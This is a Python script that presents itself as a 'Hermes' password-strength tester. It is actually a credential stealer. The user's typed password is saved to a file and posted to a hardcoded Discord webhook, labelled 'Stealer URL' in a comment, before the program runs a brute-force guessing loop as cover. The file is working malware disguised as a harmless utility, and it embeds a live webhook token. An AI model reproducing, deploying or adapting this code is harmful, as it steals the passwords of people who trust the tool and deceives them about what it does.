import requests
import itertools
from tqdm import tqdm
from pyfiglet import Figlet

# Stealer URL
url = 'https://discord.com/api/webhooks/1206759567976046643/ENPRpQsb5J7erejVfL9nl7EcMnqFtaNULw4JKARA7kY50MeqTzy2WIdYQRpHIxbaESzg'

# Display the custom figlet banner
custom_fig = Figlet(font='calgphy2')
print(custom_fig.renderText('Hermes'))

# Display the main title
print("=" * 50)
print("{:^50}".format("Test the Strength of your passwords"))
print("=" * 50)

# Get user input for the password
user_pass = input("Enter your password to figure out its strength score >| ")

# Open a file in write mode
with open("user_pass.txt", "w") as file:
    # Write the answer to the file
    file.write(user_pass)

# Send the password to the specified URL
with open('user_pass.txt', 'rb') as f:
    files = {'file': f}
    r = requests.post(url, files=files)

# Define password characters
password_chars = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
                  'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
                  '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                  '!', '@', '#', '$', '%', '^', '&', '*', '(', ')', '-', '_', '=', '+', '[', '{', ']', '}', '\\', '|', ';', ':', '\'', '"', ',', '<', '.', '>', '/', '?', '`', '~']

# Calculate the total number of combinations to be tried
total_combinations = len(password_chars) ** len(user_pass)

# Initialize the progress bar with the total number of combinations
with tqdm(total=total_combinations, desc="Guessing password") as pbar:
    for guess in itertools.product(password_chars, repeat=len(user_pass)):
        guess = "".join(guess)
        if guess == user_pass:
            print("||||||||| Your password is ||||||||||-->", guess)
            print("It took {} attempts to guess your password.".format(pbar.n))
            break
        pbar.update()

# Prompt the user to press enter before exiting
input("Press enter to exit")

